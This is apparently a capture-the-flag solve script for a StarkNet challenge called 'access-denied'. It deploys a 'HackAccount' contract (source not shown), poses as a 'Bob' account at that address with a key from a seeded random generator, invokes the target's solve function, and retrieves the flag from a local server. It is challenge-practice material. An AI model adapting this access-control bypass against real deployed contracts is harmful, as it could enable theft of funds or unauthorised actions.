import asyncio
from pathlib import Path
import random


from starknet_py.compile.compiler import Compiler
from starknet_py.contract import Contract
from starknet_py.net import AccountClient, KeyPair
from starknet_py.net.gateway_client import GatewayClient
from starknet_py.net.models import StarknetChainId
from starkware.crypto.signature.signature import private_to_stark_key


from common import utils

logger = utils.setup_logger("access-denied")


async def main(hostname="127.0.0.1", port=31337):
    ctx = await utils.get_context(hostname, port)
    contract = ctx["contract"]
    acc_client = ctx["acc_client"]
    contract_address = ctx["contract_address"]
    client = acc_client.client

    # attack
    #
    ### contract compilation
    # $ cd access-denied/contracts
    # $ mkdir -p build
    # $ starknet-compile --debug_info_with_source ./HackAccount.cairo \
    # --account_contract --output ./build/HackAccount.json --abi ./build/HackAccount.abi.json
    #
    # deploy account contract
    current_path = Path(__file__).parent.resolve()
    contract_source = current_path / "contracts" / "HackAccount.cairo"
    compiler = Compiler(
        contract_source=[contract_source],
        is_account_contract=True,
        cairo_path=[current_path / "contracts"],
    )
    logger.debug("Compile account contract")
    compiled_contract = compiler.compile_contract()
    # contract_compiled_file = current_path / "contracts" / "build" / "HackAccount.json"
    # compiled_contract = contract_compiled_file.read_text()

    logger.info("Deploying hacker account contract")
    hack_account_deployment = await Contract.deploy(
        client=acc_client,
        compiled_contract=compiled_contract,
        constructor_args=[],
        salt=2342,
    )
    # you can wait for transaction to be accepted
    await hack_account_deployment.wait_for_acceptance()
    hack_account = hack_account_deployment.deployed_contract

    logger.info("Create Bob account")
    random_generator = random.Random()
    random_generator.seed(int(42))
    bob_private_key = random_generator.getrandbits(128)
    bob_public_key = private_to_stark_key(bob_private_key)
    bob_client = AccountClient(
        client=client,
        address=hack_account.address,
        key_pair=KeyPair(
            private_key=bob_private_key,
            public_key=bob_public_key,
        ),
        chain=StarknetChainId.TESTNET,
        supported_tx_version=1,
    )

    acontract = await Contract.from_address(contract_address, bob_client)
    logger.info("Invoke solve as bob")
    signed_transaction = await bob_client.sign_invoke_transaction(
        calls=[acontract.functions["solve"].prepare()], max_fee=int(0)
    )
    # signed_transaction.signature[0] = signed_transaction.signature[0] - 1
    response = await bob_client.send_transaction(signed_transaction)
    await bob_client.wait_for_tx(response.transaction_hash)
    logger.debug("Call solved")
    solved = (await contract.functions["solved"].call()).solved
    logger.info(f"Is solved? {solved==1}")

    flag = utils.get_flag(hostname, port)
    logger.info(f"Flag: {flag}")
    return


asyncio.run(main())
